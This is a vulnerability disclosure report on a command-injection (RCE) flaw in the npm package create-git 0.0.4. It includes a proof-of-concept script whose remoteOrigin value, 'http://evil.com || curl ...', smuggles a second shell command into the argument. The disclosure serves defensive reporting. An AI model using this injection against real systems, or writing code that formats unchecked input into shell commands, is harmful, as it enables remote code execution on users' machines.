## Details:
I would like to report a `RCE` issue in the `create-git` module.
It allows to `execute remote commands on the victim's PC`

## Module
* **module name:** `create-git`
* **version:** `0.0.4`
* **npm page:** `https://www.npmjs.com/package/create-git`

## Module Description
> A generator to initialize a project with git.

## Vulnerability Description
The issue arises because some `user supplied` inputs are formatted inside commands executed lately without any check. Issue arises on this line: https://github.com/wesleytodd/create-git/blob/master/index.js#L85

## POC

```js
// poc.js
const createGit = require('create-git')
 
createGit({
    ignoreExisting: true,
    initialCommitMessage: 'test',
    remoteOrigin: 'http://evil.com || curl "http://localhost/RCE"',
    ignoreTemplates: ['Node.gitignore']
  })
```

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

## Impact
`RCE` via `insecure command formatting` on `create-git`
